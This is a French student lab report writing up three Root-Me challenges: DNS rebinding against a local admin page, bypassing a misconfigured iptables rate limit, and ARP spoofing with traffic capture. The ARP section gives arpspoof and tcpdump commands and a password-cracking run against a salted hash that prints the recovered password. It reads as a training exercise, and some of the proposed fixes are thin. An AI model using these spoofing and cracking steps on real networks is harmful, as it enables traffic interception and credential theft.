# TP6 : Un peu de root-me

## I. DNS Rebinding

**🌞 Write-up de l'épreuve**

```
requete dns normale et legitime :
1) utilisateur rentre url, client envoie une requete dns pour resoudre le nom de domaine en une adresse IP
2) le client verifie sur l'ip est stocké dans le cache si elle est presente alors elle passe les etapes suivante
3) si l'ip n'est pas dans le cache, le client envoie la requete au serveur dns ( du routeur 🤷‍♂️ ) 
4) le serveur dns consulte sa db ou relaie a d'autre serveurs DNS jusqu'a trouver l'ip
5) une fois l'ip trouvé le serveur envoie la reponse 

reponse dns dns normale et legitime

dans une reponse il y a :

adresse ip associée au nom de domaine
le type d'enregistrement ( A, AAAA, MX) 
et le TTL qui indique la durée pendant laquelle la reponse est considérée valide et donc peut etre stockée dans le cache

donc le role du TTL c'est par exemple un TTL de 300s signifie que la reponse peut etre reutilisée pendant 5 minutes 

on peut mettre le TTL a une valeur tres basse, comme ça le client renvoie des requetes dns constamment et nous on peut changer le domaine pour qu'il pointe vers une ip locale par exemple

avec le site suivant : https://lock.cmpxchg8b.com/rebinder.html

on peut faire une attaque dns rebinding

d48126e0.7f000001.rbndr.us:54022/admin

et on spam le site avec des requetes dns pour que le TTL soit toujours valide et on peut acceder a l'admin
```
**🌞 Proposer une version du code qui n'est pas vulnérable**

```
faire un check sur la requete sur le ttl = 0 si c'est le cas alors on ne renvoie pas la reponse
```


## II. Netfilter erreurs courantes

**🌞 Write-up de l'épreuve**

```
Après analyse du code, on peut voir que le script iptables est mal configuré. Plus particulierement cette ligne : 
IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j DROP

donc f5 très fort ou curl répétés ou un ptit boucle for qui fait les curl

```

[Voici le script pour bypass la règle](netfilter.sh)
ou juste a faire ctrl + f5 sur la page web


```
Nicely done:)

There are probably a few things the administrator was missing when writing this ruleset:

    1) When a rule does not match, the next one is tested against

    2) When jumped in a user defined chain, if there is no match, then the
       search resumes at the next rule in the previous (calling) chain

    3) The 'limit' match is used to limit the rate at which a given rule can
       match: above this limit, 1) applies

    4) When a rule with a 'terminating' target (e.g.: ACCEPT, DROP...) matches
       a packet, then the search stops: the packet won't be tested against any
       other rules
    
The flag is: ************
```

**🌞 Proposer un jeu de règles firewall**  

```
iptables -N HTTP_LIMIT
iptables -A INPUT -p tcp --dport 80 -m conntrack --ctstate NEW -j HTTP_LIMIT
iptables -A HTTP_LIMIT -m limit --limit 3/sec --limit-burst 10 -j RETURN
iptables -A HTTP_LIMIT -j DROP
```

## III. ARP Spoofing Ecoute active

**🌞 Write-up de l'épreuve**

```
root@fac50de5d760:~#apt update && apt install nmap dsniff tcpdump build -y

root@fac50de5d760:~#arpspoof -i eth0 -t 172.18.0.4 172.18.0.2
root@fac50de5d760:~#arpspoof -i eth0 -t 172.18.0.2 172.18.0.4
root@fac50de5d760:~#tcpdump -i eth0 -n -nn not port 22 -w toto.pcap


slayz@debian:~$ odd-crack 'hex(sha1_raw($p)+sha1_raw($s.sha1_raw(sha1_raw($p))))' --salt hex:2d0b063e696a68582529680c402a21776f777862 Téléchargements/rockyou.txt 0907f80d40a6fa807c59dece79af83f7d988b141
[*] loading file...
[*] found heyheyhey=0907f80d40a6fa807c59dece79af83f7d988b141
[*] all hashes found, shutdown requested
[*] done, tried 4700 passwords

```
[Voir la capture Wireshark](TP6/toto.pcap)

**🌞 Proposer une configuration pour empêcher votre attaque**

```
chiffrer les données 
Segmenter le reseau en VLAN
```

```
update la base de données mysql changé de type d'authentification
```